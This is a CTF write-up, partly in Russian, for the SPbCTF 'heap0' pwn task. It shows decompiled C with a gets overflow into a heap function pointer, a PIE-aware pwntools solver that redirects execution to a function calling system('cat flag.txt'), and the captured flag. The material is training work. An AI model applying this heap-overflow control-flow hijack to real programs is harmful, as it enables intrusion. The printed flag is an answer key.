[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn7_heap0)
Just do that
`nc 109.233.56.90 11750`
**[heap0.elf](https://pwn.spbctf.ru/files/heap/heap0/heap0.elf)**

Main:
``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  void *data; // [rsp+10h] [rbp-10h]
  void (__fastcall **function)(void *); // [rsp+18h] [rbp-8h]

  setvbuf(stdout, nullptr, 2, 0);
  data = malloc(0x40u);
  function = malloc(8u);
  *function = nowinner;

  printf("data is at %p, fp is at %p, main at %p\n", data, function, main);
  gets(data);
  (*function)(data);
}
```

Также имеется функция:
``` C
int winner()
{
  puts("level passed");
  return system("cat flag.txt");
}
```
Необходимо переполнить буфер args и перезаписать адрес nowinner на winner.

Из qira видно, что необходимо сделать 0x50 байт паддинга, прежде чем изменить адрес функции с 0x11A8 на 0x1189, перезаписав только первый байт памяти. Из-за того, что включён PIE необходимо считать адрес начала функции main и отталкиваясь от неё прыгнуть на функцию win.
![{18F56992-F49B-4A83-B4C1-09A1E254AB4D}](../../../../z.%20Images/{18F56992-F49B-4A83-B4C1-09A1E254AB4D}.png)

Солвер:
``` python
io = start()

io.recvuntil(b'main at ')
maint_addr = int(io.recvline().decode()[:-1], 16)
win_addr = (maint_addr & 0xFFFFFFFFFFFFFF00) | 0x89

payload = b'A' * 0x50 + p64(win_addr)
io.sendline(payload)

io.interactive()
```

Запуск:
![{4EE3011F-B604-4A10-8ABD-861C50454540}](../../../../z.%20Images/{4EE3011F-B604-4A10-8ABD-861C50454540}.png)

Ответ: `SPBCTF{S1MP13_H34P_0}`